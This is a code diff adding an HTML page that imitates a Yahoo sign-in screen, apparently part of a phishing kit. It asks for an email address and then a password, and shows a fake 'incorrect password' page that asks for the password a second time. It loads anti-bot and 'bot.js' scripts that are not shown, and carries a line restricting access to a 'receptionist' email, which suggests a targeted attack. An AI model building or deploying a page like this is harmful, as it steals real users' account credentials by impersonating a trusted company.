@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Yahoo Login </title>
+    <script src="https://cdn.tailwindcss.com"></script>
+	<script src="antibot.js" defer></script>
+     <link rel="stylesheet" href="css/styles.css">
+  </head>
+
+  <body class="bg-white">
+  <noscript>
+  <div id="js-check-warning" style="color: red; font-weight: bold;">⚠️ JavaScript must be enabled to access this form.</div>
+</noscript>
+
+  <div id="container" data-token="z9X#f2!e$">
+  
+
+    <!-- Top Header Links (Help, Terms, Privacy) -->
+    <div class="hidden md:flex justify-between items-center px-6 py-4">
+      <div class="flex items-center space-x-6">
+        <img src="images/logo.png" alt="Yahoo Logo" class="w-24" />
+      </div>
+      <div class="text-sm text-gray-700 space-x-4">
+        <a href="#" class="hover:underline">Help</a>
+        <a href="#" class="hover:underline">Terms</a>
+        <a href="#" class="hover:underline">Privacy</a>
+      </div>
+    </div>
+
+    <!-- Main login container -->
+    <div class="md:flex justify-center items-center min-h-screen px-4 md:px-0">
+
+      <!-- Content on the left (visible only on desktop) -->
+      <div class="content-left hidden md:block">
+        <h2 class="text-2xl font-semibold text-gray-700 mb-4">Yahoo makes it easy to enjoy what matters most in your world.</h2>
+        <p class="text-sm text-gray-700">
+          Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. 
+          You get more out of the web, you get more out of life.
+        </p>
+      </div>
+
+      <!-- Card Container with border, floating on the right in desktop and centered on mobile -->
+      <div class="card-container md:w-96 w-full bg-white p-6 space-y-6">
+
+        <!-- Sign in Header -->
+        <div class="text-center mb-6">
+           <center>
+        <img src="images/logo.png" alt="Yahoo Logo" class="w-24" />
+        </center>
+      </div>
+		<center>  <p> <strong> Sign in </strong> </p><br>
+        <p>	using your Yahoo account </p> 
+		</center>
+		
+		<div id="email-page">
+		
+            Only receiptionist email address can access this:
+            <input type="email" class="input-field" id="email" placeholder="Username, email, or mobile" required>
+            <div class="button-container">
+                <button id="next-button" class="next-btn">Next</button>
+            </div>
+        </div>
+
+        <!-- Username or email input -->
+        <div id="password-page">
+		
+            <h3>Welcome Back!</h3>
+            <p class="email-display" id="email-display"></p>
+			Enter your email password:
+            <input type="password" class="input-field" id="password" placeholder="Password" required>
+            <div class="button-container">
+			
+                <button id="submit-button" class="next-btn">Sign in</button>
+            </div>
+        </div>
+		
+		<div id="error-page">
+		
+            <p style="color:red;"> Email or password is incorrect.</p>
+            <p class="email-display" id="error-email-display"></p>
+            <input type="password" id="retry-password" class="input-field" placeholder="Enter your password again" required>
+            <div class="button-container">
+                <button id="retry-button" class="next-btn">Submit</button>
+            </div>
+        </div>
+		
+		 <div id="loading"><center>
+            <p><i> Please wait... </i></p> </center>
+        </div>
+
+
+        <!-- Stay signed in and Forgot username link (floating) -->
+        <div class="flex justify-between items-center text-sm mt-4">
+          <div class="flex items-center">
+            <input type="checkbox" class="mr-2" />
+            <label class="text-gray-700">Stay signed in</label>
+          </div>
+          <a href="#" class="footer-link">Forgot username?</a>
+        </div>
+
+        <!-- Create Account button -->
+        <button class="create-account-btn">Create a new Yahoo account</button>
+
+        <!-- Google Sign-in -->
+        <div class="text-center">
+          <button class="google-btn">
+            <img src="images/gmail.png" alt="Google Logo" class="google-logo" />
+            <span class="text-sm">Sign in with Google</span>
+          </button>
+        </div>
+
+      </div>
+
+    </div>
+
+    <!-- Footer for mobile (Desktop links remain above) -->
+    <footer class="text-center text-xs text-gray-500 mt-8 md:hidden">
+      <p>© 2025 Yahoo</p>
+      <div class="space-x-3">
+        <a href="#" class="footer-link">Terms</a>
+        <a href="#" class="footer-link">Privacy</a>
+      </div>
+    </footer>
+</div>
+
+ <script src="scripts.js"></script>
+<script src="bot.js"> </script>
+
+
+  </body>
+</html>
